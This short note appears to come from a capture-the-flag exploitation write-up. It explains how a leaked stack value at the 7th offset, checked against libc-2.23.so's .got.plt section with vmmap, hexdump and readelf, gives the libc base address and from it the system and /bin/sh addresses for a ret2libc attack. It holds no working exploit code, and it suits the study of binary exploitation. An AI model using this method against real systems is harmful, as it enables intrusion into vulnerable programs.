There is a weird value in the 7th offset from name variable (assume this number is a),
after checking with vmmap we know that value belongs to file /lib/i386-linux-gnu/libc-2.23.so,
and with hexdump we also know the first value of that libc file is libc base address (assume b),
and if we take b - a = c, that c number will belong to a unknown section header.
Checking with readelf -S /lib/i386-linux-gnu/libc-2.23.so | grep $c, 
we know that number belongs to .got.plt section.
So now, we have gotplt.offset from libc file and gotplt.addr from the 7th offset,
===> we will have libc base address 
===> system_addr and binsh_addr to exploit
NOTE: if we have libc file, we can find a lot of thing in that file, but we just have offset,
somehow we must have libc base address ...
